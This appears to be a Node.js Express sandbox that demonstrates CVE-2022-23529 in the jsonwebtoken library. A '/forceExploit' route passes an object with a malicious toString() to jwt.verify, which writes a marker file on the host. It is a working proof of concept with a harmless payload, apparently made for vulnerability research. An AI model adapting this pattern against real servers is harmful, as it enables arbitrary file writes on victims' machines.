const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
// import * as url from "url";
const jwt = require("jsonwebtoken");

// const __dirname = url.fileURLToPath(new URL(".", import.meta.url));

const app = express();
const port = 3000;

app.set("view engine", "pug");
app.set("views", path.join(__dirname, "/view"));

app.use(express.static(path.join(__dirname, "/static")));

app.use(bodyParser.json());

app.get('/', (req, res) => {
  res.render('index');
});

app.post("/forceExploit", (req, res) => {
  process.chdir(path.join(__dirname, "/exploitOutput"));
  console.log("Forcing exploit");
  const token = jwt.sign({"x":"y"}, "some_secret");

  const mal_obj = {
    toString: () => { 
      console.log("PWNED!!!");
      require("fs").writeFileSync("malicious.txt", "PWNED!!!! Arbitrary File Write on the host machine");
    }
  }

  try {
    jwt.verify(token, mal_obj);
  } catch (error) {
    console.error(error);
  } finally {
    const dirList = require("fs").readdirSync(".");
    res.status(200).send(dirList);
  }
})

app.listen(port, () => {
  console.log(`Cve-2022-23529 sandbox listening on port ${port}`);
});